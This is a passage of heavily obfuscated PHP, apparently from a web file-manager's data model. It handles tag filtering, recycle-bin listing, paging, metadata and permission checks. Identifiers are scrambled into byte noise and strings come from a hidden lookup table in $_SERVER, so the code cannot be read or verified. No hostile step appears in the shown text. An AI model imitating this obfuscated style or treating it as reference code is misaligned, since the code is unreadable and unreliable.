$€‘ºŒ¼[$‘õ°¥¤®[$Ş´ËÇàÉ[87]]]; } } unset($‘õ°¥¤®); return $ÈÜ£Ñ›‰; } public function listUserTag($öÌÑÆ‰·) { $±‰•ò¹ô =& $_SERVER[¶Ô„œ…¯]; if ($öÌÑÆ‰· && !is_array($öÌÑÆ‰·)) { $öÌÑÆ‰· = array($öÌÑÆ‰·); } $ÅÏæÌö = Model($±‰•ò¹ô[501])->listData(); $Š÷Ô€éè = array(); $ĞªŒÃ“İ = array(); foreach ($ÅÏæÌö as $Çš¡òşã) { $‘ß±ıÇì = $Çš¡òşã[$±‰•ò¹ô[87]]; if (!$‘ß±ıÇì) { continue; } if (!isset($ĞªŒÃ“İ[$‘ß±ıÇì])) { $ĞªŒÃ“İ[$‘ß±ıÇì] = array(); } $ĞªŒÃ“İ[$‘ß±ıÇì][] = $Çš¡òşã[$±‰•ò¹ô[502]]; $Š÷Ô€éè[$Çš¡òşã[$±‰•ò¹ô[87]]] = $Çš¡òşã; } $«º¸Õ«â = array(); $íç÷«áŒ = array(); $²àÆåçÜ = array(); foreach ($ĞªŒÃ“İ as $‹ÂÆ¾ï¤ => $Ÿ»×ãü®) { $Û„ƒáÜ– = !0; if (!$öÌÑÆ‰·) { $«º¸Õ«â[] = $‹ÂÆ¾ï¤; continue; } foreach ($öÌÑÆ‰· as $…÷œ¯„Î) { if (!in_array($…÷œ¯„Î, $Ÿ»×ãü®)) { $Û„ƒáÜ– = !1; break; } } if (!$Û„ƒáÜ–) { continue; } if (!is_numeric($‹ÂÆ¾ï¤)) { $ƒîÖ÷àã = $Š÷Ô€éè[$‹ÂÆ¾ï¤]; $÷ĞñÂË” = array($±‰•ò¹ô[32] => $ƒîÖ÷àã[$±‰•ò¹ô[32]], $±‰•ò¹ô[87] => $ƒîÖ÷àã[$±‰•ò¹ô[87]], $±‰•ò¹ô[33] => $ƒîÖ÷àã[$±‰•ò¹ô[33]], $±‰•ò¹ô[90] => array($±‰•ò¹ô[503] => 1), $±‰•ò¹ô[234] => !0); if ($ƒîÖ÷àã[$±‰•ò¹ô[33]] == $±‰•ò¹ô[232]) { $²àÆåçÜ[] = $÷ĞñÂË”; } if ($ƒîÖ÷àã[$±‰•ò¹ô[33]] == $±‰•ò¹ô[78]) { $íç÷«áŒ[] = $÷ĞñÂË”; } continue; } $«º¸Õ«â[] = $‹ÂÆ¾ï¤; } if ($«º¸Õ«â) { $®¢èé¬ = $this->listSource(array($±‰•ò¹ô[493] => array($±‰•ò¹ô[494], $«º¸Õ«â))); } $®¢èé¬ = $®¢èé¬ ? $®¢èé¬ : array($±‰•ò¹ô[85] => array(), $±‰•ò¹ô[86] => array()); $®¢èé¬[$±‰•ò¹ô[85]] = array_merge($®¢èé¬[$±‰•ò¹ô[85]], $íç÷«áŒ); $®¢èé¬[$±‰•ò¹ô[86]] = array_merge($®¢èé¬[$±‰•ò¹ô[86]], $²àÆåçÜ); if (isset($®¢èé¬[$±‰•ò¹ô[444]]) && count($«º¸Õ«â) == $®¢èé¬[$±‰•ò¹ô[444]][$±‰•ò¹ô[445]]) { return $®¢èé¬; } $„´îÜêˆ = array(); $ôÌ£ğ­¦ = array_to_keyvalue($®¢èé¬[$±‰•ò¹ô[85]], $±‰•ò¹ô[12], $±‰•ò¹ô[193]); $ç´ äÔß = array_to_keyvalue($®¢èé¬[$±‰•ò¹ô[86]], $±‰•ò¹ô[12], $±‰•ò¹ô[193]); $¤êÇÂ— = array_merge($ç´ äÔß, $ôÌ£ğ­¦); foreach ($«º¸Õ«â as $‘ß±ıÇì) { if (!in_array($‘ß±ıÇì, $¤êÇÂ—)) { $„´îÜêˆ[] = $‘ß±ıÇì; } } if ($„´îÜêˆ) { Model($±‰•ò¹ô[504])->removeBySource($„´îÜêˆ); } return $®¢èé¬; } public function listUserRecycle() { $ÏÀÈŒÚÎ =& $_SERVER[¶Ô„œ…¯]; $Ò¨Ìàûš = Model($ÏÀÈŒÚÎ[505])->listData(); if (!$Ò¨Ìàûš) { return array(); } $³“ù†Ç = array($ÏÀÈŒÚÎ[493] => array($ÏÀÈŒÚÎ[494], $Ò¨Ìàûš), $ÏÀÈŒÚÎ[506] => 1); return $this->listSource($³“ù†Ç); } public function listSource($èÖï°·, $ùã˜Ïû› = 3000, $Šáí‡â• = false) { $²¶½šÀû =& $_SERVER[¶Ô„œ…¯]; if (!isset($èÖï°·[$²¶½šÀû[507]])) { $èÖï°·[$²¶½šÀû[507]] = 0; } if (isset($èÖï°·[$²¶½šÀû[192]]) && $èÖï°·[$²¶½šÀû[192]] == $²¶½šÀû[230]) { $èÖï°·[$²¶½šÀû[488]] = array($²¶½šÀû[508], $²¶½šÀû[12]); } $ó¢«¢é = $²¶½šÀû[509]; $µçÂü×½ = $this->field($ó¢«¢é)->_makeOrder()->where($èÖï°·)->selectPage($ùã˜Ïû›); $this->_listPageCheck($µçÂü×½, $ó¢«¢é, $èÖï°·); $this->_listDataApply($µçÂü×½[$²¶½šÀû[447]], $Šáí‡â•); $this->_listMake($µçÂü×½); return $µçÂü×½; } private function _listPageCheck(&$÷Õ¨ÓÅí, $ßÚÏŠíË, $·ÑÕè) { $¾£Şå´© =& $_SERVER[¶Ô„œ…¯]; if (!is_array($÷Õ¨ÓÅí[$¾£Şå´©[444]])) { return; } $‘—•Éâœ = $÷Õ¨ÓÅí[$¾£Şå´©[444]]; if ($‘—•Éâœ[$¾£Şå´©[446]] <= 1) { return; } if ($‘—•Éâœ[$¾£Şå´©[445]] >= 100000) { return; } if (Model($¾£Şå´©[510])->get($¾£Şå´©[511]) != $¾£Şå´©[512]) { return; } $ßÚÏŠíË = str_replace(array($¾£Şå´©[53], $¾£Şå´©[419], $¾£Şå´©[287]), $¾£Şå´©[12], $ßÚÏŠíË); $ßÚÏŠíË = $¾£Şå´©[513] . str_replace($¾£Şå´©[50], $¾£Şå´©[514], $ßÚÏŠíË) . $¾£Şå´©[515]; $­ÅÊ¦ªª = $¾£Şå´©[516]; $­ÅÊ¦ªª = $­ÅÊ¦ªª . $¾£Şå´©[517]; $¼û»â—¸ = $‘—•Éâœ[$¾£Şå´©[441]] * ($‘—•Éâœ[$¾£Şå´©[430]] - 1) . $¾£Şå´©[50] . $‘—•Éâœ[$¾£Şå´©[441]]; $¦‡óöç = $this->_makeOrder(!0); $¹¢Ïò£ = $¾£Şå´©[513] . str_replace($¾£Şå´©[50], $¾£Şå´©[514], $¦‡óöç[0]); if (strpos($¹¢Ïò£, $¾£Şå´©[518])) { $¹¢Ïò£ = str_replace($¾£Şå´©[518], $¾£Şå´©[519], $¹¢Ïò£); } else { $¹¢Ïò£ .= $¾£Şå´©[520] . $¦‡óöç[1]; } $®ó¡ = array(); foreach ($·ÑÕè as $®÷ÂŒ¯ => $Ïçğóô) { $®ó¡[$¾£Şå´©[513] . $®÷ÂŒ¯] = $Ïçğóô; } $this->alias($¾£Şå´©[521])->field($ßÚÏŠíË)->limit($¼û»â—¸)->order($¹¢Ïò£); $Šˆø€û = $this->join($­ÅÊ¦ªª)->where($®ó¡)->select(); if ($Šˆø€û) { $÷Õ¨ÓÅí[$¾£Şå´©[447]] = $Šˆø€û; } } protected function _makeOrder($ˆ§ØÑÚ¬ = false) { $Şõª½Í  =& $_SERVER[¶Ô„œ…¯]; $»§©¨™ = Model($Şõª½Í [522])->get($Şõª½Í [523]); $œÅ¦† = Model($Şõª½Í [522])->get($Şõª½Í [524]); $æé˜‘Åú = array($Şõª½Í [525] => $Şõª½Í [526], $Şõª½Í [527] => $Şõª½Í [528]); $èß§‹¸Ê = array($Şõª½Í [32] => $Şõª½Í [32], $Şõª½Í [79] => $Şõª½Í [79], $Şõª½Í [169] => $Şõª½Í [488], $Şõª½Í [529] => $Şõª½Í [529], $Şõª½Í [530] => $Şõª½Í [531], $Şõª½Í [233] => $Şõª½Í [233], $Şõª½Í [88] => $Şõª½Í [88]); $§¼­¤ºĞ = Input::get($Şõª½Í [532], $Şõª½Í [7], $»§©¨™, array_keys($èß§‹¸Ê)); $¢£Î’¸ = Input::get($Şõª½Í [533], $Şõª½Í [7], $œÅ¦†, array_keys($æé˜‘Åú)); if (!in_array($§¼­¤ºĞ, array_keys($èß§‹¸Ê))) { $§¼­¤ºĞ = $Şõª½Í [32]; } if (!in_array($¢£Î’¸, array_keys($æé˜‘Åú))) { $§¼­¤ºĞ = $Şõª½Í [525]; } if ($§¼­¤ºĞ == $Şõª½Í [32]) { } $©äÀ¯ë† = $Şõª½Í [534] . $èß§‹¸Ê[$§¼­¤ºĞ] . $Şõª½Í [53] . $æé˜‘Åú[$¢£Î’¸]; $©äÀ¯ë† = rtrim(trim($©äÀ¯ë†), $Şõª½Í [50]); if ($ˆ§ØÑÚ¬) { return array($©äÀ¯ë†, $æé˜‘Åú[$¢£Î’¸]); } return $this->order($©äÀ¯ë†); } protected function _listDataApplyItem($å‡íñÆ®, $Ô¯¾ßæü = false) { $ÄÛ×¹í„ = array($å‡íñÆ®); $this->_listDataApply($ÄÛ×¹í„, $Ô¯¾ßæü); return $ÄÛ×¹í„[0]; } protected function _listDataApply(&$†êÜ ­’, $·‚‰ôç = false) { $¹éóõæµ =& $_SERVER[¶Ô„œ…¯]; if (!$†êÜ ­’) { $†êÜ ­’ = array(); return; } $¥§ùÜëñ = array_to_keyvalue($†êÜ ­’, $¹éóõæµ[12], $¹éóõæµ[193]); $¥§ùÜëñ = array_unique($¥§ùÜëñ); $this->_listSourceCache($†êÜ ­’); if (!$·‚‰ôç) { $this->_listAppendMeta($†êÜ ­’, $¥§ùÜëñ); $this->_listAppendFileMeta($†êÜ ­’, $¥§ùÜëñ); $this->_listAppendChildren($†êÜ ­’, $¥§ùÜëñ); } $this->_listAppendPath($†êÜ ­’); $this->_listAppendAuth($†êÜ ­’); $this->_listAppendSourceInfo($†êÜ ­’, $¥§ùÜëñ); $this->_listAppendUser($†êÜ ­’); $this->_listFilterInfo($†êÜ ­’, $·‚‰ôç); $this->_listAppendAuthSecret($†êÜ ­’); } protected function _listSourceCache($ˆı˜æõ) { $¢¿Â„ºç =& $_SERVER[¶Ô„œ…¯]; foreach ($ˆı˜æõ as $¶ç—¬©¸) { self::$cacheSourceInfo[$¢¿Â„ºç[535] . $¶ç—¬©¸[$¢¿Â„ºç[193]]] = $¶ç—¬©¸; } } protected function _listFilterInfo(&$«ü›¯çä, $œ¦ìÍ° = false) { $Îš”ªò =& $_SERVER[¶Ô„œ…¯]; foreach ($«ü›¯çä as &$ÏÏµÛˆÑ) { $ÏÏµÛˆÑ = $this->pathInfoFilter($ÏÏµÛˆÑ); self::$cachePathInfo[$Îš”ªò[536] . intval($œ¦ìÍ°) . $Îš”ªò[464] . $ÏÏµÛˆÑ[$Îš”ªò[193]]] = $ÏÏµÛˆÑ; } unset($ÏÏµÛˆÑ); } protected function _listMake(&$ç¿´–‰º) { $Ğº÷ˆ„¯ =& $_SERVER[¶Ô„œ…¯]; $ç¿´–‰º[$Ğº÷ˆ„¯[85]] = array(); $ç¿´–‰º[$Ğº÷ˆ„¯[86]] = array(); foreach ($ç¿´–‰º[$Ğº÷ˆ„¯[447]] as $î˜Ÿ™’) { $µÖ‹çÎÛ = $î˜Ÿ™’[$Ğº÷ˆ„¯[487]] == 1 ? $Ğº÷ˆ„¯[85] : $Ğº÷ˆ„¯[86]; $ç¿´–‰º[$µÖ‹çÎÛ][] = $î˜Ÿ™’; } unset($ç¿´–‰º[$Ğº÷ˆ„¯[447]]); } protected function _listAppendMeta(&$»ÂË¸ÓÍ, $¶ô×˜ğÕ) { $ô°“öé =& $_SERVER[¶Ô„œ…¯]; $šêå£»Œ = array($ô°“öé[493] => array($ô°“öé[494], $¶ô×˜ğÕ)); $ğú¬Ö¢ = Model($ô°“öé[537])->field($ô°“öé[538])->where($šêå£»Œ)->select(); if (!$ğú¬Ö¢) { return; } $ª—ĞèÂÃ = array($ô°“öé[539], $ô°“öé[540], $ô°“öé[519]); $€‰å‚Õ€ = array(); foreach ($ğú¬Ö¢ as $Ş•Àè°) { if (!isset($€‰å‚Õ€[$Ş•Àè°[$ô°“öé[193]]])) { $€‰å‚Õ€[$Ş•Àè°[$ô°“öé[193]]] = array(); } if (in_array($Ş•Àè°[$ô°“öé[97]], $ª—ĞèÂÃ)) { continue; } $€‰å‚Õ€[$Ş•Àè°[$ô°“öé[193]]][$Ş•Àè°[$ô°“öé[97]]] = $Ş•Àè°[$ô°“öé[452]]; } foreach ($»ÂË¸ÓÍ as &$ƒÍÖÆ‡ş) { $ƒÍÖÆ‡ş[$ô°“öé[541]] = !1; if (isset($€‰å‚Õ€[$ƒÍÖÆ‡ş[$ô°“öé[193]]])) { $ƒÍÖÆ‡ş[$ô°“öé[541]] = $€‰å‚Õ€[$ƒÍÖÆ‡ş[$ô°“öé[193]]]; } if ($this->fileIsLock($ƒÍÖÆ‡ş) && $ƒÍÖÆ‡ş[$ô°“öé[489]]) { $³ôÛº·¤ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ƒÍÖÆ‡ş[$ô°“öé[489]][$ô°“öé[490]] = AuthModel::authDisable($ƒÍÖÆ‡ş[$ô°“öé[489]][$ô°“öé[490]], $³ôÛº·¤); $ƒÍÖÆ‡ş[$ô°“öé[489]][$ô°“öé[542]][$ô°“öé[489]] = $ƒÍÖÆ‡ş[$ô°“öé[489]][$ô°“öé[490]]; } } unset($ƒÍÖÆ‡ş); } protected function _listAppendFileMeta(&$ê‡ñ˜ú‹, $åĞÈ…‚‡) { $­›—ßŠ =& $_SERVER[¶Ô„œ…¯]; $ıÙº‘óü = array_to_keyvalue($ê‡ñ˜ú‹, $­›—ßŠ[12], $­›—ßŠ[543]); $ıÙº‘óü = array_filter(array_unique($ıÙº‘óü)); if (!$ıÙº‘óü) { return; } $„ÒÚâ‡š = array($­›—ßŠ[544] => array($­›—ßŠ[494], $ıÙº‘óü)); $•«¶Ìˆ¯ = $­›—ßŠ[545]; $à·ññŠı = Model($­›—ßŠ[546])->field($•«¶Ìˆ¯)->where($„ÒÚâ‡š)->select(); $à·ññŠı = array_to_keyvalue($à·ññŠı, $­›—ßŠ[543]); $šÆüø»ô = Model($­›—ßŠ[547])->field($­›—ßŠ[548])->where($„ÒÚâ‡š)->select(); $šÆüø»ô = $šÆüø»ô ? $šÆüø»ô : array(); $„Å±½®Ñ = array(); foreach ($šÆüø»ô as $ÔÅòß‡¯) { if (!isset($„Å±½®Ñ[$ÔÅòß‡¯[$­›—ßŠ[543]]])) { $„Å±½®Ñ[$ÔÅòß‡¯[$­›—ßŠ[543]]] = array(); } $„Å±½®Ñ[$ÔÅòß‡¯[$­›—ßŠ[543]]][$ÔÅòß‡¯[$­›—ßŠ[97]]] = $ÔÅòß‡¯[$­›—ßŠ[452]]; } foreach ($ê‡ñ˜ú‹ as &$Ã·ÙÂ—ë) { $³›ˆ±Œ± = $Ã·ÙÂ—ë[$­›—ßŠ[543]]; if (!$³›ˆ±Œ± || !is_array($à·ññŠı[$³›ˆ±Œ±])) { continue; } $ğ¡ªÃÓÂ = $à·ññŠı[$³›ˆ±Œ±]; $ğ¡ªÃÓÂ[$­›—ßŠ[79]] = $Ã·ÙÂ—ë[$­›—ßŠ[79]]; $ğ¡ªÃÓÂ[$­›—ßŠ[32]] = $Ã·ÙÂ—ë[$­›—ßŠ[32]]; if (!$ğ¡ªÃÓÂ[$­›—ßŠ[549]]) { Model($­›—ßŠ[546])->fileMd5Check($ğ¡ªÃÓÂ); } if (!isset(self::$cacheFileInfo[$­›—ßŠ[550] . $³›ˆ±Œ±])) { self::$cacheFileInfo[$­›—ßŠ[550] . $³›ˆ±Œ±] = array_merge(array(), $ğ¡ªÃÓÂ); } unset($à·ññŠı[$³›ˆ±Œ±][$­›—ßŠ[87]]); $µª¶«†Ñ = isset($„Å±½®Ñ[$³›ˆ±Œ±]) && is_array($„Å±½®Ñ[$³›ˆ±Œ±]) ? $„Å±½®Ñ[$³›ˆ±Œ±] : array(); $Ã·ÙÂ—ë[$­›—ßŠ[170]] = array_merge($µª¶«†Ñ, $à·ññŠı[$³›ˆ±Œ±]); if (isset($Ã·ÙÂ—ë[$­›—ßŠ[170]][$­›—ßŠ[184]])) { $Ã·ÙÂ—ë[$­›—ßŠ[184]] = json_decode($Ã·ÙÂ—ë[$­›—ßŠ[170]][$­›—ßŠ[184]], !0); unset($Ã·ÙÂ—ë[$­›—ßŠ[170]][$­›—ßŠ[184]]); } } unset($Ã·ÙÂ—ë); } protected function _listAppendSourceInfo(&$ò—äşú, $ïä÷á™) { $“°î­‰ =& $_SERVER[¶Ô„œ…¯]; $¥¬Ì¤Â™ = Model($“°î­‰[551])->listData(); $à±“Ã«Ñ = Model($“°î­‰[501])->listData(); $¸ÑñÓŒ¶ = Model($“°î­‰[491])->listData(); $ĞË†Ô˜Ä = Model($“°î­‰[552])->listSimple(); $Ïå—À‘ = array_to_keyvalue($¥¬Ì¤Â™, $“°î­‰[477]); $ ğóíîÂ = array_to_keyvalue_group($à±“Ã«Ñ, $“°î­‰[87], $“°î­‰[502]); $‹ƒ¤×®¦ = array_to_keyvalue($¸ÑñÓŒ¶, $“°î­‰[87]); $Ûû²Äãç = array_to_keyvalue_group($ĞË†Ô˜Ä, $“°î­‰[193]); foreach ($ò—äşú as &$¯À˜õïñ) { $¯À˜õïñ[$“°î­‰[90]] = array($“°î­‰[553] => 0, $“°î­‰[554] => 0, $“°î­‰[555] => 0); if (isset($‹ƒ¤×®¦[$¯À˜õïñ[$“°î­‰[193]]])) { $¯À˜õïñ[$“°î­‰[90]][$“°î­‰[556]] = 1; $¯À˜õïñ[$“°î­‰[90]][$“°î­‰[557]] = $‹ƒ¤×®¦[$¯À˜õïñ[$“°î­‰[193]]][$“°î­‰[32]]; } if ($ ğóíîÂ && $Ïå—À‘ && isset($ ğóíîÂ[$¯À˜õïñ[$“°î­‰[193]]])) { $¯À˜õïñ[$“°î­‰[90]][$“°î­‰[558]] = array(); foreach ($ ğóíîÂ[$¯À˜õïñ[$“°î­‰[193]]] as $ûºçÉÍü) { $óË¨Îê = $Ïå—À‘[$ûºçÉÍü]; $¯À˜õïñ[$“°î­‰[90]][$“°î­‰[558]][] = array($“°î­‰[559] => $óË¨Îê[$“°î­‰[477]], $“°î­‰[496] => $óË¨Îê[$“°î­‰[32]], $“°î­‰[560] => $óË¨Îê[$“°î­‰[561]]); } } if ($Ûû²Äãç && isset($Ûû²Äãç[$¯À˜õïñ[$“°î­‰[193]]])) { $¯À˜õïñ[$“°î­‰[90]][$“°î­‰[562]] = array(); foreach ($Ûû²Äãç[$¯À˜õïñ[$“°î­‰[193]]] as $›ÓüÍ°) { $¢¼İßŸ´ = $“°î­‰[563]; if ($›ÓüÍ°[$“°î­‰[564]] == $“°î­‰[91]) { $¢¼İßŸ´ .= $“°î­‰[565]; } $¯À˜õïñ[$“°î­‰[90]][$“°î­‰[562]] = array_field_key($›ÓüÍ°, explode($“°î­‰[50], $¢¼İßŸ´)); } } } unset($¯À˜õïñ); return $ò—äşú; } protected function _listAppendChildren(&$Çê´£€, $±™ÍÙÅ) { $ğ“Ã¨úÆ =& $_SERVER[¶Ô„œ…¯]; $’á‰¬¡À = array(); $©ÁÙ©ì¬ = array($ğ“Ã¨úÆ[241] => 0, $ğ“Ã¨úÆ[242] => 0); foreach ($Çê´£€ as &$©ê„¬¸) { if (!$©ê„¬¸[$ğ“Ã¨úÆ[487]]) { continue; } $’á‰¬¡À[] = $©ê„¬¸[$ğ“Ã¨úÆ[193]]; } unset($©ê„¬¸); if (!$’á‰¬¡À) { return; } $óõ™¿å¼ = array($ğ“Ã¨úÆ[192] => array($ğ“Ã¨úÆ[7], $’á‰¬¡À), $ğ“Ã¨úÆ[507] => 0); $Ï³÷‰Š = array($ğ“Ã¨úÆ[192], $ğ“Ã¨úÆ[487], $ğ“Ã¨úÆ[566] => $ğ“Ã¨úÆ[567]); $€Ğ“• = $this->field($Ï³÷‰Š)->where($óõ™¿å¼)->group($ğ“Ã¨úÆ[568])->select(); $Àîô¿Ò = array(); foreach ($€Ğ“• as $ãÆòÂğ›) { $Ÿ˜ô®´§ = $ãÆòÂğ›[$ğ“Ã¨úÆ[192]]; $©ÒÖÇ§ = $ãÆòÂğ›[$ğ“Ã¨úÆ[487]] == $ğ“Ã¨úÆ[91] ? $ğ“Ã¨úÆ[242] : $ğ“Ã¨úÆ[241]; if (!isset($Àîô¿Ò[$Ÿ˜ô®´§])) { $Àîô¿Ò[$Ÿ˜ô®´§] = array($ğ“Ã¨úÆ[241] => 0, $ğ“Ã¨úÆ[242] => 0); } $Àîô¿Ò[$Ÿ˜ô®´§][$©ÒÖÇ§] += $ãÆòÂğ›[$ğ“Ã¨úÆ[567]]; } foreach ($Çê´£€ as &$©ê„¬¸) { if (!$©ê„¬¸[$ğ“Ã¨úÆ[487]]) { continue; } $Éõƒ©ŞÌ = is_array($Àîô¿Ò[$©ê„¬¸[$ğ“Ã¨úÆ[193]]]) ? $Àîô¿Ò[$©ê„¬¸[$ğ“Ã¨úÆ[193]]] : $©ÁÙ©ì¬; $©ê„¬¸[$ğ“Ã¨úÆ[242]] = $Éõƒ©ŞÌ[$ğ“Ã¨úÆ[242]]; $©ê„¬¸[$ğ“Ã¨úÆ[241]] = $Éõƒ©ŞÌ[$ğ“Ã¨úÆ[241]]; unset($©ê„¬¸[$ğ“Ã¨úÆ[488]]); } unset($©ê„¬¸); } protected function _listAppendAuth(&$–ÊÇÆ¸ä) { $¯à‡½ =& $_SERVER[¶Ô„œ…¯]; $âøˆ ™Ê = array(); foreach ($–ÊÇÆ¸ä as $Ñ‰‰èş) { if ($Ñ‰‰èş[$¯à‡½[190]] == self::TYPE_GROUP) { $âøˆ ™Ê[] = $Ñ‰‰èş[$¯à‡½[193]]; } } if (!$âøˆ ™Ê) { return; } $½£¶£”… = array_to_keyvalue($–ÊÇÆ¸ä, $¯à‡½[193]); $†ŒÃÁ’ = Model($¯à‡½[569])->getSourceList($âøˆ ™Ê, $½£¶£”…); $è¼º¥á = KodUser::isRoot(); foreach ($–ÊÇÆ¸ä as $ü©Óç => &$Ñ‰‰èş) { $Ñ‰‰èş[$¯à‡½[489]] = $†ŒÃÁ’[$Ñ‰‰èş[$¯à‡½[193]]]; if (!$Ñ‰‰èş[$¯à‡½[489]] && $Ñ‰‰èş[$¯à‡½[190]] == self::TYPE_GROUP) { $Ñ‰‰èş[$¯à‡½[489]] = Action($¯à‡½[570])->pathGroupAuthMake($Ñ‰‰èş[$¯à‡½[571]]); if (!$Ñ‰‰èş[$¯à‡½[489]] && !$è¼º¥á) { $Ñ‰‰èş[$¯à‡½[235]] = !1; $Ñ‰‰èş[$¯à‡½[234]] = !1; } } if ($Ñ‰‰èş[$¯à‡½[489]]) { $Ñ‰‰èş[$¯à‡½[235]] = AuthModel::authCheckEdit($Ñ‰‰èş[$¯à‡½[489]][$¯à‡½[490]]); $Ñ‰‰èş[$¯à‡½[234]] = AuthModel::authCheckView($Ñ‰‰èş[$¯à‡½[489]][$¯à‡½[490]]); } $this->groupPathDisplay($Ñ‰‰èş); } unset($Ñ‰‰èş); } public function _listAppendAuthSecret(&$àŸÎâºĞ) { $ˆÈæÙù¦ =& $_SERVER[¶Ô„œ…¯]; if (Model($ˆÈæÙù¦[510])->get($ˆÈæÙù¦[572]) != $ˆÈæÙù¦[91]) { return; } static $ÏñÛõĞ = false; if (!$ÏñÛõĞ) { $®µœ®óé = Model($ˆÈæÙù¦[573]); $äÒ³îÄ = Model($ˆÈæÙù¦[574]); $ÏñÛõĞ = $äÒ³îÄ->listData(); $ÏñÛõĞ = array_to_keyvalue($ÏñÛõĞ, $ˆÈæÙù¦[193]); $ñËàÅÇ¨ = json_decode(Model($ˆÈæÙù¦[510])->get($ˆÈæÙù¦[575]), !0); $ñËàÅÇ¨ = array_to_keyvalue($ñËàÅÇ¨, $ˆÈæÙù¦[477]); foreach ($ÏñÛõĞ as $‘­éÜæ¤ => $ïÎ¦µÚû) { $•ªâ½Ãó = $ñËàÅÇ¨[$ïÎ¦µÚû[$ˆÈæÙù¦[576]]]; if (!$•ªâ½Ãó) { $äÒ³îÄ->remove($ïÎ¦µÚû[$ˆÈæÙù¦[477]]); unset($ÏñÛõĞ[$‘­éÜæ¤]); continue; } $…Æ¯—»¥ = $®µœ®óé->listData($•ªâ½Ãó[$ˆÈæÙù¦[489]]); if (!$…Æ¯—»¥) { $äÒ³îÄ->remove($ïÎ¦µÚû[$ˆÈæÙù¦[477]]); unset($ÏñÛõĞ[$‘­éÜæ¤]); continue; } $ïÎ¦µÚû[$ˆÈæÙù¦[489]] = $…Æ¯—»¥; $ïÎ¦µÚû[$ˆÈæÙù¦[577]] = $•ªâ½Ãó; $ïÎ¦µÚû[$ˆÈæÙù¦[578]] = Model($ˆÈæÙù¦[579])->getInfoSimpleOuter($ïÎ¦µÚû[$ˆÈæÙù¦[529]]); $ÏñÛõĞ[$‘­éÜæ¤] = $ïÎ¦µÚû; } } $êçÅŠš = USER_ID; $ğÜœÖ›³ = array(); $‚ôäÔÎ = $this->_listAppendPath($ğÜœÖ›³, !0); foreach ($àŸÎâºĞ as $‘­éÜæ¤ => &$ïÎ¦µÚû) { if (!is_array($ïÎ¦µÚû[$ˆÈæÙù¦[489]])) { continue; } if ($ïÎ¦µÚû[$ˆÈæÙù¦[190]] != $ˆÈæÙù¦[580]) { continue; } if (isset($ÏñÛõĞ[$ïÎ¦µÚû[$ˆÈæÙù¦[193]]])) { $²ŸÙÓâí = $ÏñÛõĞ[$ïÎ¦µÚû[$ˆÈæÙù¦[193]]]; if (!is_array($ïÎ¦µÚû[$ˆÈæÙù¦[541]])) { $ïÎ¦µÚû[$ˆÈæÙù¦[541]] = array(); } $ïÎ¦µÚû[$ˆÈæÙù¦[541]][$ˆÈæÙù¦[581]] = $²ŸÙÓâí[$ˆÈæÙù¦[576]]; $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[582]] = $²ŸÙÓâí; $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[583]] = $ïÎ¦µÚû[$ˆÈæÙù¦[584]]; $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[585]] = $ˆÈæÙù¦[91]; if ($²ŸÙÓâí[$ˆÈæÙù¦[529]] != $êçÅŠš) { $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[490]] = $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[490]] & $²ŸÙÓâí[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[489]]; } continue; } $‚èğÆ²¬ = $this->parentLevelArray($ïÎ¦µÚû[$ˆÈæÙù¦[586]]); $¼›Ó®© = array_reverse($‚èğÆ²¬); foreach ($¼›Ó®© as $•ƒæ†´— => $çüŸë¤Ã) { if (!isset($ÏñÛõĞ[$çüŸë¤Ã])) { continue; } $²ŸÙÓâí = $ÏñÛõĞ[$çüŸë¤Ã]; $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[582]] = $²ŸÙÓâí; if ($²ŸÙÓâí[$ˆÈæÙù¦[529]] != $êçÅŠš) { $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[490]] = $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[490]] & $²ŸÙÓâí[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[489]]; } $˜¸ŞŠÖ = $ˆÈæÙù¦[12]; $õã°¸ê = count($‚èğÆ²¬) - $•ƒæ†´—; for ($şıŒÊ© = 0; $şıŒÊ© < $õã°¸ê; $şıŒÊ©++) { if (!isset($‚ôäÔÎ[$‚èğÆ²¬[$şıŒÊ©]])) { $˜¸ŞŠÖ = $ˆÈæÙù¦[12]; break; } $˜¸ŞŠÖ = $˜¸ŞŠÖ . rtrim($‚ôäÔÎ[$‚èğÆ²¬[$şıŒÊ©]], $ˆÈæÙù¦[8]) . $ˆÈæÙù¦[8]; } $ïÎ¦µÚû[$ˆÈæÙù¦[489]][$ˆÈæÙù¦[583]] = rtrim($˜¸ŞŠÖ, $ˆÈæÙù¦[8]) . $ˆÈæÙù¦[8]; break; } } unset($ïÎ¦µÚû); } public function groupPathDisplay(&$Õ‹†—‡) { $â¡ŠÏÃ¬ =& $_SERVER[¶Ô„œ…¯]; if ($Õ‹†—‡[$â¡ŠÏÃ¬[190]] != self::TYPE_GROUP) { return; } $’¶¹˜á‰ = Model($â¡ŠÏÃ¬[587])->getInfo($Õ‹†—‡[$â¡ŠÏÃ¬[571]]); $úÑÍ©˜ = $this->parentLevelArray($’¶¹˜á‰[$â¡ŠÏÃ¬[586]]); $ÌÑ¾Ü = $â¡ŠÏÃ¬[12]; foreach ($úÑÍ©˜ as $¹Ñö‚¥€) { $şĞ™ğ›É = Model($â¡ŠÏÃ¬[587])->getInfo($¹Ñö‚¥€); $ÌÑ¾Ü .= $şĞ™ğ›É[$â¡ŠÏÃ¬[90]][$â¡ŠÏÃ¬[193]] . $â¡ŠÏÃ¬[50]; } $Õ‹†—‡[$â¡ŠÏÃ¬[588]] = $’¶¹˜á‰[$â¡ŠÏÃ¬[192]]; $Õ‹†—‡[$â¡ŠÏÃ¬[589]] = $’¶¹˜á‰[$â¡ŠÏÃ¬[586]]; $Õ‹†—‡[$â¡ŠÏÃ¬[590]] = $’¶¹˜á‰[$â¡ŠÏÃ¬[591]]; $Õ‹†—‡[$â¡ŠÏÃ¬[592]] = $ÌÑ¾Ü . $’¶¹˜á‰[$â¡ŠÏÃ¬[90]][$â¡ŠÏÃ¬[193]]; } protected function _listAppendPath(&$îªü¤³ö, 